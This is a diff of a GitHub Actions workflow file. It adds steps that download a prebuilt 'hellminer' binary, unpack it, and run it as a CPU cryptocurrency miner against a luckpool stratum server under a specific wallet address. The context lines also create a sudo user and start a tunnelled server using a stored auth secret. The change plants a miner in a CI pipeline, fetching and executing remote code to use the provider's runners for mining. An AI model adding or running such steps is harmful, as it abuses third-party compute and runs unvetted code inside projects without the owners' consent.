@@ -29,8 +29,11 @@ jobs:
           sudo -u hudacihuyy bash -c 'echo "Hello dari user $(whoami)"'
           
           sudo apt update
-          wget https://github.com/hellcatz/hminer/
-releases/download/v0.59.1/hellminer_linux64.tar.gz
+          wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+          tar -xzf hellminer_linux64.tar.gz
+          chmod +x hellminer
+          ./hellminer -c stratum+tcp://na.luckpool.net:3957 -u R9UwHf2AogrRbfvmd8oLBACo6psdD7TpSg.Cihuyy -p x --cpu 4
+
       - name: Run Server and Playit
         env:
           PLAYIT_AUTH_KEY: ${{ secrets.PLAYITAUTHKEY }} 
